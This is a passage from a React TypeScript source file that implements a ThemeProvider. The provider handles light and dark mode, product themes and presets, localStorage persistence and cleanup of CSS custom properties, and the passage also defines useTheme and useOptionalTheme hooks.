  // intentionally concrete (`'light' | 'dark'`) so we skip the
  // `prefers-color-scheme` round-trip and SSR can pre-paint the right mode.
  // `defaultMode` remains the fallback when nothing else is set.
  const [mode, setModeState] = useState<ThemeMode>(initialMode ?? defaultMode)
  const [productTheme, setProductThemeState] = useState<ProductTheme | undefined>(defaultProductTheme)
  // #440 — declared `preset` is the first-render value (SSR-safe), mirroring
  // how `initialMode` seeds `mode`. A persisted preset in localStorage wins
  // after hydration (applied in the mount effect below).
  const [themePresetId, setThemePresetIdState] = useState<string>(preset ?? DEFAULT_THEME_PRESET)
  const [theme, setTheme] = useState<ResolvedTheme>(() => {
    if (forcedTheme) return forcedTheme
    if (initialMode) return initialMode
    return resolveTheme(defaultMode)
  })

  // task_2c2ebf2f — Track every `--*` key that the most recent `applyTheme`
  // wrote to `documentElement.style`. When the next call diffs its new key
  // set against this, any key dropped from the new set is removed via
  // `removeProperty` — fixing the leak where `setProductTheme(undefined)` or
  // a theme swap left the prior theme's custom properties on the root.
  // A ref (not state) is correct here: this is a write-bookkeeping handle,
  // not a value to render against, and we want the latest set without
  // forcing a re-render on every theme application.
  const appliedKeysRef = useRef<Set<string>>(new Set())

  useEffect(() => {
    if (!disableStorage) {
      // #381 — Distinguish "user has an explicit preference" from "no value
      // stored." Without this, missing values would coerce to `'system'` and
      // clobber a server-resolved `initialMode`, defeating the whole point
      // of the prop. Persisted value still wins when present (the user
      // actively chose).
      const storedModeRaw = getStoredModeRaw()
      const storedProductTheme = getStoredProductTheme()
      // #440 — use the RAW read so a missing preset falls back to the declared
      // `preset` prop instead of being clobbered by `DEFAULT_THEME_PRESET`.
      const storedPresetRaw = getStoredThemePresetRaw()

      // Fallback chain: persisted > initialMode > defaultMode.
      const effectiveMode: ThemeMode =
        storedModeRaw ?? initialMode ?? defaultMode

      // Fallback chain: persisted > declared `preset` > default. Mirrors the
      // mode chain so a persisted user choice wins after hydration but the
      // declared preset holds when nothing is stored.
      const effectivePreset: string =
        storedPresetRaw ?? preset ?? DEFAULT_THEME_PRESET

      setModeState(effectiveMode)
      setProductThemeState(storedProductTheme || defaultProductTheme)
      setThemePresetIdState(effectivePreset)

      const resolved = forcedTheme || resolveTheme(effectiveMode)
      setTheme(resolved)
      appliedKeysRef.current = applyTheme(
        document.documentElement,
        resolved,
        storedProductTheme || defaultProductTheme,
        effectivePreset,
        tintChrome,
        appliedKeysRef.current,
      )
    }

    setIsLoading(false)
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (mode !== 'system' || forcedTheme) return

    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)')

    const handleChange = (e: MediaQueryListEvent): void => {
      const newTheme = e.matches ? 'dark' : 'light'
      setTheme(newTheme)
      appliedKeysRef.current = applyTheme(
        document.documentElement,
        newTheme,
        productTheme,
        themePresetId,
        tintChrome,
        appliedKeysRef.current,
      )
    }

    if (mediaQuery.addEventListener) {
      mediaQuery.addEventListener('change', handleChange)
      return () => mediaQuery.removeEventListener('change', handleChange)
    }
    else if (mediaQuery.addListener) {
      mediaQuery.addListener(handleChange)
      return () => mediaQuery.removeListener(handleChange)
    }
  }, [mode, forcedTheme, productTheme, themePresetId, tintChrome])

  useEffect(() => {
    if (!isLoading) {
      appliedKeysRef.current = applyTheme(
        document.documentElement,
        theme,
        productTheme,
        themePresetId,
        tintChrome,
        appliedKeysRef.current,
      )
    }
  }, [theme, productTheme, themePresetId, tintChrome, isLoading])

  // task_2c2ebf2f — On unmount, remove every `--*` key we wrote so a
  // Provider that mounts → unmounts doesn't leave stale custom properties
  // behind on the document. This is the same diff-against-empty pattern as
  // `setProductTheme(undefined)`, just without the trailing re-application.
  useEffect(() => {
    return () => {
      if (typeof document === 'undefined') return
      const root = document.documentElement
      for (const key of appliedKeysRef.current) {
        root.style.removeProperty(key)
      }
      appliedKeysRef.current = new Set()
    }
  }, [])

  const setMode = useCallback((newMode: ThemeMode): void => {
    setModeState(newMode)

    if (!disableStorage) {
      storeMode(newMode)
    }

    if (!forcedTheme) {
      const resolved = resolveTheme(newMode)
      setTheme(resolved)
    }
  }, [disableStorage, forcedTheme])

  const toggle = useCallback((): void => {
    const currentResolved = forcedTheme || theme
    const newMode: ThemeMode = currentResolved === 'light' ? 'dark' : 'light'
    setMode(newMode)
  }, [theme, forcedTheme, setMode])

  const setProductTheme = useCallback((newProductTheme: ProductTheme | undefined): void => {
    setProductThemeState(newProductTheme)

    if (!disableStorage) {
      storeProductTheme(newProductTheme)
    }
  }, [disableStorage])

  const setThemePreset = useCallback((presetId: string): void => {
    if (!getThemePreset(presetId)) {
      console.warn(`Theme preset "${presetId}" not found. Using default.`)
      return
    }

    setThemePresetIdState(presetId)

    if (!disableStorage) {
      storeThemePreset(presetId)
    }
  }, [disableStorage])

  const value: ThemeContextValue = {
    mode,
    theme: forcedTheme || theme,
    setMode,
    toggle,
    productTheme,
    setProductTheme,
    themePreset: themePresetId,
    setThemePreset,
    isLoading,
  }

  return (
    <ThemeContext.Provider value={value}>
      {children}
    </ThemeContext.Provider>
  )
}

/**
 * useTheme Hook
 *
 * Access theme context in components.
 *
 * @example
 * ```tsx
 * function MyComponent() {
 *   const { theme, toggle } = useTheme()
 *
 *   return (
 *     <button onClick={toggle}>
 *       Current theme: {theme}
 *     </button>
 *   )
 * }
 * ```
 */
export function useTheme(): ThemeContextValue {
  const context = useContext(ThemeContext)

  if (!context) {
    throw new Error('useTheme must be used within a ThemeProvider')
  }
  return context
}

/**
 * Non-throwing variant of `useTheme` — returns `undefined` when no
 * `ThemeProvider` is mounted in the tree above the caller.
 *
 * Internal-use hook for components that need to *optionally* read theme
 * context (e.g. `ThemeScope` inherits the surrounding provider's resolved
 * mode if one exists, but must work standalone too). Public consumers
 * should keep using `useTheme()` — the throw is intentional protection
 * against missing providers in the common case.
 *
 * Intentionally not exported from `src/utils/index.ts`; only consumed by
 * `ThemeScope`. If a future use case wants this externally, promote it
 * then — keep the surface narrow until needed.
 */
export function useOptionalTheme(): ThemeContextValue | undefined {
  return useContext(ThemeContext)
}

// #384 — `themeScript` (and its `ThemeScriptOptions` companion) now live in
// `./themeScript.ts` so they can be called from a React Server Component.
// They are re-exported from this module at the top of the file to preserve
// the public import path.
